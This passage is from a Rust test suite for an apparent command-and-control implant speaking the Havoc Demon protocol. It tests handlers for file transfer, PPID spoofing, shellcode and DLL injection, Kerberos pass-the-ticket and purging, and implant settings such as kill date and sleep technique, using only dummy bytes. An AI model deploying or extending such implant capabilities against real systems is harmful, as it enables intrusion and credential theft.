        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── FS Download tests ───────────────────────────────────────────────────

    #[test]
    fn fs_download_opens_file_and_returns_open_header() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_test_fsd_{}", rand::random::<u32>()));
        std::fs::write(&path, b"hello world").expect("write");

        let path_str = path.display().to_string();
        let rest = le_utf16le_payload(&path_str);
        let mut downloads = DownloadTracker::new();
        let result = handle_fs_download(2, &rest, 42, &mut downloads);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };

        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));

        // Parse the BE header: [subcmd(4)][mode(4)][file_id(4)][file_size(8)][path…]
        let payload = &resp.payload;
        let subcmd = u32::from_be_bytes(payload[0..4].try_into().expect("u32"));
        assert_eq!(subcmd, 2); // Download
        let mode = u32::from_be_bytes(payload[4..8].try_into().expect("u32"));
        assert_eq!(mode, DOWNLOAD_MODE_OPEN);
        let file_size = u64::from_be_bytes(payload[12..20].try_into().expect("u64"));
        assert_eq!(file_size, 11); // "hello world".len()

        // Download should be registered.
        assert_eq!(downloads.len(), 1);

        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn fs_download_nonexistent_file_returns_ignore() {
        let rest = le_utf16le_payload("/tmp/specter_nonexistent_file_test_12345");
        let mut downloads = DownloadTracker::new();
        let result = handle_fs_download(2, &rest, 1, &mut downloads);
        assert!(matches!(result, DispatchResult::Ignore));
        assert!(downloads.is_empty());
    }

    // ── FS Upload tests ─────────────────────────────────────────────────────

    #[test]
    fn fs_upload_writes_file_from_memfile() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_test_fsu_{}", rand::random::<u32>()));
        let path_str = path.display().to_string();
        let content = b"uploaded data";
        let mem_file_id: u32 = 42;

        // Pre-stage the MemFile.
        let mut mem_files: MemFileStore = HashMap::new();
        mem_files
            .insert(mem_file_id, MemFile { expected_size: content.len(), data: content.to_vec() });

        // Build payload: [path: bytes LE (UTF-16LE)][mem_file_id: u32 LE]
        let mut rest = le_utf16le_payload(&path_str);
        rest.extend_from_slice(&mem_file_id.to_le_bytes());

        let result = handle_fs_upload(3, &rest, &mut mem_files);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };

        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));

        // Verify file was written.
        let written = std::fs::read(&path).expect("read back");
        assert_eq!(written, content);

        // Parse BE response: [subcmd(4)][file_size(4)][path…]
        let file_size = u32::from_be_bytes(resp.payload[4..8].try_into().expect("u32"));
        assert_eq!(file_size, content.len() as u32);

        // MemFile should be consumed.
        assert!(!mem_files.contains_key(&mem_file_id));

        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn fs_upload_missing_memfile_returns_ignore() {
        let mut mem_files: MemFileStore = HashMap::new();
        // Build payload: [path: bytes LE][mem_file_id: u32 LE]
        let mut rest = le_utf16le_payload("/tmp/specter_test_no_memfile");
        rest.extend_from_slice(&99u32.to_le_bytes()); // non-existent memfile ID
        let result = handle_fs_upload(3, &rest, &mut mem_files);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn fs_upload_incomplete_memfile_returns_ignore() {
        let mut mem_files: MemFileStore = HashMap::new();
        mem_files.insert(
            7,
            MemFile {
                expected_size: 100,
                data: vec![0u8; 50], // only half staged
            },
        );
        let mut rest = le_utf16le_payload("/tmp/specter_test_incomplete");
        rest.extend_from_slice(&7u32.to_le_bytes());
        let result = handle_fs_upload(3, &rest, &mut mem_files);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── MemFile tests ────────────────────────────────────────────────────────

    /// Build a MemFile payload: [mem_file_id: u32 LE][total_size: u64 LE][chunk: bytes LE]
    fn memfile_payload(mem_file_id: u32, total_size: u64, chunk: &[u8]) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&mem_file_id.to_le_bytes());
        v.extend_from_slice(&total_size.to_le_bytes());
        v.extend_from_slice(&(chunk.len() as u32).to_le_bytes());
        v.extend_from_slice(chunk);
        v
    }

    #[test]
    fn parse_u64_le_reads_correct_value() {
        let buf = 0x0102_0304_0506_0708u64.to_le_bytes();
        let mut offset = 0;
        assert_eq!(parse_u64_le(&buf, &mut offset).expect("parse"), 0x0102_0304_0506_0708);
        assert_eq!(offset, 8);
    }

    #[test]
    fn parse_u64_le_too_short_returns_error() {
        let buf = [0u8; 7];
        let mut offset = 0;
        assert!(parse_u64_le(&buf, &mut offset).is_err());
    }

    #[test]
    fn memfile_single_chunk_complete() {
        let data = b"hello world";
        let payload = memfile_payload(1, data.len() as u64, data);
        let mut store: MemFileStore = HashMap::new();

        let result = handle_memfile(&payload, 10, &mut store);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandMemFile));
        assert_eq!(resp.request_id, 10);
        // success = true (1)
        assert_eq!(u32::from_be_bytes(resp.payload[4..8].try_into().unwrap()), 1);

        let entry = store.get(&1).expect("memfile should exist");
        assert!(entry.is_complete());
        assert_eq!(entry.data, data);
    }

    #[test]
    fn memfile_multi_chunk_accumulates() {
        let mut store: MemFileStore = HashMap::new();
        let total: u64 = 10;

        // First chunk: 6 bytes.
        let payload1 = memfile_payload(5, total, &[1, 2, 3, 4, 5, 6]);
        let result1 = handle_memfile(&payload1, 1, &mut store);
        assert!(matches!(result1, DispatchResult::Respond(_)));
        assert!(!store.get(&5).unwrap().is_complete());

        // Second chunk: 4 bytes — completes the file.
        let payload2 = memfile_payload(5, total, &[7, 8, 9, 10]);
        let result2 = handle_memfile(&payload2, 2, &mut store);
        assert!(matches!(result2, DispatchResult::Respond(_)));
        assert!(store.get(&5).unwrap().is_complete());
        assert_eq!(store.get(&5).unwrap().data, &[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]);
    }

    #[test]
    fn memfile_size_mismatch_returns_failure() {
        let mut store: MemFileStore = HashMap::new();

        // First chunk declares total_size = 10.
        let payload1 = memfile_payload(3, 10, &[1, 2, 3]);
        let _ = handle_memfile(&payload1, 1, &mut store);

        // Second chunk declares total_size = 20 (mismatch).
        let payload2 = memfile_payload(3, 20, &[4, 5, 6]);
        let result = handle_memfile(&payload2, 2, &mut store);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        // success = false (0)
        assert_eq!(u32::from_be_bytes(resp.payload[4..8].try_into().unwrap()), 0);
    }

    #[test]
    fn memfile_truncates_overflow() {
        let mut store: MemFileStore = HashMap::new();
        // Declare total_size = 4 but send 6 bytes.
        let payload = memfile_payload(8, 4, &[1, 2, 3, 4, 5, 6]);
        let _ = handle_memfile(&payload, 1, &mut store);
        let entry = store.get(&8).unwrap();
        assert_eq!(entry.data, &[1, 2, 3, 4]);
        assert!(entry.is_complete());
    }

    #[test]
    fn memfile_then_upload_end_to_end() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_test_mfu_{}", rand::random::<u32>()));
        let path_str = path.display().to_string();
        let content = b"memfile-upload";
        let mem_id: u32 = 77;

        let mut store: MemFileStore = HashMap::new();

        // Stage the MemFile.
        let mf_payload = memfile_payload(mem_id, content.len() as u64, content);
        let _ = handle_memfile(&mf_payload, 1, &mut store);
        assert!(store.get(&mem_id).unwrap().is_complete());

        // Now issue the Upload command referencing the MemFile.
        let mut rest = le_utf16le_payload(&path_str);
        rest.extend_from_slice(&mem_id.to_le_bytes());
        let result = handle_fs_upload(3, &rest, &mut store);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));

        // File written correctly.
        let written = std::fs::read(&path).expect("read back");
        assert_eq!(written, content);

        // MemFile consumed.
        assert!(!store.contains_key(&mem_id));

        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn dispatch_routes_command_memfile() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let mut mem_files: MemFileStore = HashMap::new();

        let payload = memfile_payload(1, 5, &[1, 2, 3, 4, 5]);
        let package = DemonPackage::new(DemonCommand::CommandMemFile, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut mem_files,
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
        assert!(mem_files.contains_key(&1));
    }

    // ── dispatch routing tests for new commands ─────────────────────────────

    #[test]
    fn dispatch_routes_command_transfer() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let payload = transfer_payload(0, &[]); // Transfer::List
        let package = DemonPackage::new(DemonCommand::CommandTransfer, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    // ── Process injection tests ─────────────────────────────────────────────

    /// Build a `CommandProcPpidSpoof` payload: LE u32 PID.
    fn ppid_spoof_payload(ppid: u32) -> Vec<u8> {
        ppid.to_le_bytes().to_vec()
    }

    /// Build a `CommandInjectShellcode` payload for the Inject way.
    fn inject_shellcode_inject_payload(
        method: u32,
        x64: u32,
        shellcode: &[u8],
        args: &[u8],
        pid: u32,
    ) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&u32::from(DemonInjectWay::Inject).to_le_bytes());
        v.extend_from_slice(&method.to_le_bytes());
        v.extend_from_slice(&x64.to_le_bytes());
        // shellcode (length-prefixed)
        v.extend_from_slice(&(shellcode.len() as u32).to_le_bytes());
        v.extend_from_slice(shellcode);
        // args (length-prefixed)
        v.extend_from_slice(&(args.len() as u32).to_le_bytes());
        v.extend_from_slice(args);
        // target PID
        v.extend_from_slice(&pid.to_le_bytes());
        v
    }

    /// Build a `CommandInjectShellcode` payload for the Spawn way (no PID).
    fn inject_shellcode_spawn_payload(
        method: u32,
        x64: u32,
        shellcode: &[u8],
        args: &[u8],
    ) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&u32::from(DemonInjectWay::Spawn).to_le_bytes());
        v.extend_from_slice(&method.to_le_bytes());
        v.extend_from_slice(&x64.to_le_bytes());
        v.extend_from_slice(&(shellcode.len() as u32).to_le_bytes());
        v.extend_from_slice(shellcode);
        v.extend_from_slice(&(args.len() as u32).to_le_bytes());
        v.extend_from_slice(args);
        v
    }

    /// Build a `CommandInjectDll` payload.
    fn inject_dll_payload(
        technique: u32,
        pid: u32,
        loader: &[u8],
        dll: &[u8],
        params: &[u8],
    ) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&technique.to_le_bytes());
        v.extend_from_slice(&pid.to_le_bytes());
        v.extend_from_slice(&(loader.len() as u32).to_le_bytes());
        v.extend_from_slice(loader);
        v.extend_from_slice(&(dll.len() as u32).to_le_bytes());
        v.extend_from_slice(dll);
        v.extend_from_slice(&(params.len() as u32).to_le_bytes());
        v.extend_from_slice(params);
        v
    }

    /// Build a `CommandSpawnDll` payload.
    fn spawn_dll_payload(loader: &[u8], dll: &[u8], args: &[u8]) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&(loader.len() as u32).to_le_bytes());
        v.extend_from_slice(loader);
        v.extend_from_slice(&(dll.len() as u32).to_le_bytes());
        v.extend_from_slice(dll);
        v.extend_from_slice(&(args.len() as u32).to_le_bytes());
        v.extend_from_slice(args);
        v
    }

    // ── CommandProcPpidSpoof ─────────────────────────────────────────────────

    #[test]
    fn handle_proc_ppid_spoof_updates_config() {
        let mut config = SpecterConfig::default();
        assert!(config.ppid_spoof.is_none());

        let payload = ppid_spoof_payload(1234);
        let result = handle_proc_ppid_spoof(&payload, &mut config);

        assert_eq!(config.ppid_spoof, Some(1234));

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProcPpidSpoof));

        // Response payload: LE u32 PPID.
        assert_eq!(resp.payload.len(), 4);
        let ppid = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
        assert_eq!(ppid, 1234);
    }

    #[test]
    fn handle_proc_ppid_spoof_empty_payload_ignores() {
        let mut config = SpecterConfig::default();
        let result = handle_proc_ppid_spoof(&[], &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
        assert!(config.ppid_spoof.is_none());
    }

    #[test]
    fn dispatch_routes_proc_ppid_spoof() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let payload = ppid_spoof_payload(5678);
        let package = DemonPackage::new(DemonCommand::CommandProcPpidSpoof, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
        assert_eq!(config.ppid_spoof, Some(5678));
    }

    // ── CommandInjectShellcode ───────────────────────────────────────────────

    #[test]
    fn handle_inject_shellcode_inject_returns_response() {
        let shellcode = &[0x90, 0x90, 0xCC];
        let args = &[0x41, 0x42];
        let payload = inject_shellcode_inject_payload(0, 1, shellcode, args, 4444);
        let result = handle_inject_shellcode(&payload);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInjectShellcode));
        assert_eq!(resp.payload.len(), 4);

        // On non-Windows: status should be Failed (1).
        if !cfg!(windows) {
            let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
            assert_eq!(status, u32::from(DemonInjectError::Failed));
        }
    }

    #[test]
    fn handle_inject_shellcode_spawn_returns_response() {
        let shellcode = &[0xCC];
        let payload = inject_shellcode_spawn_payload(0, 1, shellcode, &[]);
        let result = handle_inject_shellcode(&payload);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInjectShellcode));
        assert_eq!(resp.payload.len(), 4);
    }

    #[test]
    fn handle_inject_shellcode_empty_payload_returns_invalid_param() {
        let result = handle_inject_shellcode(&[]);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
        assert_eq!(status, u32::from(DemonInjectError::InvalidParam));
    }

    #[test]
    fn dispatch_routes_inject_shellcode() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let payload = inject_shellcode_inject_payload(0, 1, &[0x90], &[], 1234);
        let package = DemonPackage::new(DemonCommand::CommandInjectShellcode, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    // ── CommandInjectDll ─────────────────────────────────────────────────────

    #[test]
    fn handle_inject_dll_returns_response() {
        let loader = &[0xCC, 0xDD, 0xEE];
        let dll = &[0x4D, 0x5A, 0x90, 0x00];
        let params = b"test-param";
        let payload = inject_dll_payload(0, 1234, loader, dll, params);
        let result = handle_inject_dll(&payload);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInjectDll));
        assert_eq!(resp.payload.len(), 4);

        if !cfg!(windows) {
            let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
            assert_eq!(status, u32::from(DemonInjectError::Failed));
        }
    }

    #[test]
    fn handle_inject_dll_empty_payload_returns_invalid_param() {
        let result = handle_inject_dll(&[]);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
        assert_eq!(status, u32::from(DemonInjectError::InvalidParam));
    }

    #[test]
    fn dispatch_routes_inject_dll() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let payload = inject_dll_payload(0, 999, &[0xCC], &[0x4D, 0x5A], b"arg");
        let package = DemonPackage::new(DemonCommand::CommandInjectDll, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    // ── CommandSpawnDll ──────────────────────────────────────────────────────

    #[test]
    fn handle_spawn_dll_returns_response() {
        let loader = &[0x11, 0x22, 0x33];
        let dll = &[0x4D, 0x5A];
        let args = b"spawn-args";
        let payload = spawn_dll_payload(loader, dll, args);
        let result = handle_spawn_dll(&payload);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandSpawnDll));
        assert_eq!(resp.payload.len(), 4);

        if !cfg!(windows) {
            let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
            assert_eq!(status, u32::from(DemonInjectError::Failed));
        }
    }

    #[test]
    fn handle_spawn_dll_empty_payload_returns_invalid_param() {
        let result = handle_spawn_dll(&[]);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
        assert_eq!(status, u32::from(DemonInjectError::InvalidParam));
    }

    #[test]
    fn dispatch_routes_spawn_dll() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let payload = spawn_dll_payload(&[0xAA], &[0xBB], b"args");
        let package = DemonPackage::new(DemonCommand::CommandSpawnDll, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    // ── inject_status_response helper ────────────────────────────────────────

    #[test]
    fn inject_status_response_encodes_le() {
        let result =
            inject_status_response(DemonCommand::CommandInjectShellcode, DemonInjectError::Success);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.payload, 0u32.to_le_bytes());
    }

    #[test]
    fn inject_status_response_failed() {
        let result =
            inject_status_response(DemonCommand::CommandInjectDll, DemonInjectError::Failed);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.payload, 1u32.to_le_bytes());
    }

    #[test]
    fn inject_status_response_arch_mismatch() {
        let result = inject_status_response(
            DemonCommand::CommandSpawnDll,
            DemonInjectError::ProcessArchMismatch,
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.payload, 3u32.to_le_bytes());
    }

    // ── Kerberos tests ─────────────────────────────────────────────────────

    /// Build a Kerberos task payload with the given subcommand and extra args.
    fn kerberos_payload(subcmd: u32, extra: &[u8]) -> Vec<u8> {
        let mut v = subcmd.to_le_bytes().to_vec();
        v.extend_from_slice(extra);
        v
    }

    #[test]
    fn kerberos_dispatch_routes_to_handler() {
        let payload = kerberos_payload(0, &[]); // Luid subcommand
        let pkg = DemonPackage {
            command_id: u32::from(DemonCommand::CommandKerberos),
            request_id: 1,
            payload,
        };
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::default();
        let mut mem_files = MemFileStore::new();
        let result = dispatch(
            &pkg,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut mem_files,
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        // On non-Windows, get_luid returns error → success=FALSE.
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandKerberos));
        // Parse: [subcmd=0][success=0]
        assert!(resp.payload.len() >= 8);
        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 0); // subcmd
        // On non-Windows, success is 0 (FALSE)
        #[cfg(not(windows))]
        assert_eq!(u32::from_le_bytes(resp.payload[4..8].try_into().unwrap()), 0);
    }

    #[test]
    fn kerberos_luid_response_format() {
        let result = handle_kerberos_luid(0);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandKerberos));
        // Subcmd should be 0.
        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 0);
        // On non-Windows: [subcmd=0][success=0] → 8 bytes
        #[cfg(not(windows))]
        assert_eq!(resp.payload.len(), 8);
    }

    #[test]
    fn kerberos_klist_all_response_format() {
        // type=0 means /all
        let mut rest = Vec::new();
        rest.extend_from_slice(&0u32.to_le_bytes()); // type = 0 (/all)
        let result = handle_kerberos_klist(1, &rest);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandKerberos));
        // [subcmd=1][success=0] on non-Windows → 8 bytes
        #[cfg(not(windows))]
        assert_eq!(resp.payload.len(), 8);
        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 1); // subcmd
    }

    #[test]
    fn kerberos_klist_by_luid_response_format() {
        // type=1 means /luid, then a LUID value
        let mut rest = Vec::new();
        rest.extend_from_slice(&1u32.to_le_bytes()); // type = 1 (/luid)
        rest.extend_from_slice(&0x1234u32.to_le_bytes()); // target LUID
        let result = handle_kerberos_klist(1, &rest);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 1);
    }

    #[test]
    fn kerberos_klist_missing_luid_ignored() {
        // type=1 but no LUID value → parse error → Ignore
        let rest = 1u32.to_le_bytes().to_vec(); // type = 1 (/luid), no LUID
        let result = handle_kerberos_klist(1, &rest);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn kerberos_purge_response_format() {
        let rest = 0xABCDu32.to_le_bytes().to_vec();
        let result = handle_kerberos_purge(2, &rest);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 2); // subcmd
        // On non-Windows: success = 0
        #[cfg(not(windows))]
        assert_eq!(u32::from_le_bytes(resp.payload[4..8].try_into().unwrap()), 0);
    }

    #[test]
    fn kerberos_purge_missing_luid_ignored() {
        let result = handle_kerberos_purge(2, &[]);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn kerberos_ptt_response_format() {
        let ticket = vec![0x61, 0x82, 0x03, 0x00];
        let luid: u32 = 0x5678;
        let mut rest = Vec::new();
        // Length-prefixed ticket bytes.
        rest.extend_from_slice(&(ticket.len() as u32).to_le_bytes());
        rest.extend_from_slice(&ticket);
        rest.extend_from_slice(&luid.to_le_bytes());
        let result = handle_kerberos_ptt(3, &rest);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 3); // subcmd
        // On non-Windows: success = 0
        #[cfg(not(windows))]
        assert_eq!(u32::from_le_bytes(resp.payload[4..8].try_into().unwrap()), 0);
    }

    #[test]
    fn kerberos_ptt_missing_ticket_ignored() {
        let result = handle_kerberos_ptt(3, &[]);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn kerberos_ptt_missing_luid_after_ticket_ignored() {
        // Valid ticket but no LUID after it.
        let mut rest = Vec::new();
        rest.extend_from_slice(&2u32.to_le_bytes()); // ticket length = 2
        rest.extend_from_slice(&[0xAA, 0xBB]); // ticket data
        // No LUID following → parse error.
        let result = handle_kerberos_ptt(3, &rest);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn kerberos_unknown_subcommand_ignored() {
        let payload = kerberos_payload(99, &[]); // invalid subcmd
        let result = handle_kerberos(&payload);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn kerberos_empty_payload_ignored() {
        let result = handle_kerberos(&[]);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── CommandConfig tests ───────────────────────────────────────────────────

    /// Build a config payload: `[key: u32 LE][extra…]`
    fn config_payload(key: u32, extra: &[u8]) -> Vec<u8> {
        let mut v = key.to_le_bytes().to_vec();
        v.extend_from_slice(extra);
        v
    }

    /// Parse a LE u32 from a response payload at the given byte offset.
    fn resp_u32(payload: &[u8], byte_offset: usize) -> u32 {
        u32::from_le_bytes(payload[byte_offset..byte_offset + 4].try_into().unwrap())
    }

    /// Parse a LE u64 from a response payload at the given byte offset.
    fn resp_u64(payload: &[u8], byte_offset: usize) -> u64 {
        u64::from_le_bytes(payload[byte_offset..byte_offset + 8].try_into().unwrap())
    }

    #[test]
    fn config_empty_payload_ignored() {
        let mut config = SpecterConfig::default();
        let result = handle_config(&[], &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn config_unknown_key_ignored() {
        let mut config = SpecterConfig::default();
        let payload = config_payload(9999, &[]);
        let result = handle_config(&payload, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn config_implant_verbose_sets_flag() {
        let mut config = SpecterConfig::default();
        assert!(!config.verbose);

        let extra = 1u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::ImplantVerbose), &extra);
        let result = handle_config(&payload, &mut config);

        assert!(config.verbose);
        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandConfig));
        assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::ImplantVerbose));
        assert_eq!(resp_u32(&resp.payload, 4), 1);
    }

    #[test]
    fn config_implant_verbose_zero_clears_flag() {
        let mut config = SpecterConfig { verbose: true, ..Default::default() };

        let extra = 0u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::ImplantVerbose), &extra);
        handle_config(&payload, &mut config);
        assert!(!config.verbose);
    }

    #[test]
    fn config_sleep_technique_updates() {
        let mut config = SpecterConfig::default();
        let extra = 3u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::ImplantSleepTechnique), &extra);
        let result = handle_config(&payload, &mut config);

        assert_eq!(config.sleep_technique, 3);
        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
        assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::ImplantSleepTechnique));
        assert_eq!(resp_u32(&resp.payload, 4), 3);
    }

    #[test]
    fn config_coffee_threaded_updates() {
        let mut config = SpecterConfig::default();
        let extra = 1u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::ImplantCoffeeThreaded), &extra);
        handle_config(&payload, &mut config);
        assert!(config.coffee_threaded);
    }

    #[test]
    fn config_coffee_veh_updates() {
        let mut config = SpecterConfig::default();
        let extra = 1u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::ImplantCoffeeVeh), &extra);
        handle_config(&payload, &mut config);
        assert!(config.coffee_veh);
    }

    #[test]
    fn config_memory_alloc_updates() {
        let mut config = SpecterConfig::default();
        let extra = 42u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::MemoryAlloc), &extra);
        let result = handle_config(&payload, &mut config);

        assert_eq!(config.memory_alloc, 42);
        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
        assert_eq!(resp_u32(&resp.payload, 4), 42);
    }

    #[test]
    fn config_memory_execute_updates() {
        let mut config = SpecterConfig::default();
        let extra = 7u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::MemoryExecute), &extra);
        handle_config(&payload, &mut config);
        assert_eq!(config.memory_execute, 7);
    }

    #[test]
    fn config_inject_technique_updates() {
        let mut config = SpecterConfig::default();
        let extra = 5u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::InjectTechnique), &extra);
        handle_config(&payload, &mut config);
        assert_eq!(config.inject_technique, 5);
    }

    #[test]
    fn config_killdate_sets_timestamp() {
        let mut config = SpecterConfig::default();
        let ts: u64 = 1_700_000_000;
        let extra = ts.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::KillDate), &extra);
        let result = handle_config(&payload, &mut config);

        assert_eq!(config.kill_date, Some(ts as i64));
        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
        assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::KillDate));
        assert_eq!(resp_u64(&resp.payload, 4), ts);
    }

    #[test]
    fn config_killdate_zero_clears() {
        let mut config = SpecterConfig { kill_date: Some(123), ..Default::default() };
        let extra = 0u64.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::KillDate), &extra);
        handle_config(&payload, &mut config);
        assert_eq!(config.kill_date, None);
    }

    #[test]
    fn config_killdate_missing_value_ignored() {
        let mut config = SpecterConfig::default();
        let payload = config_payload(u32::from(DemonConfigKey::KillDate), &[]);
        let result = handle_config(&payload, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn config_working_hours_updates() {
        let mut config = SpecterConfig::default();
        let extra = 0x00FF_FF00u32.to_le_bytes();
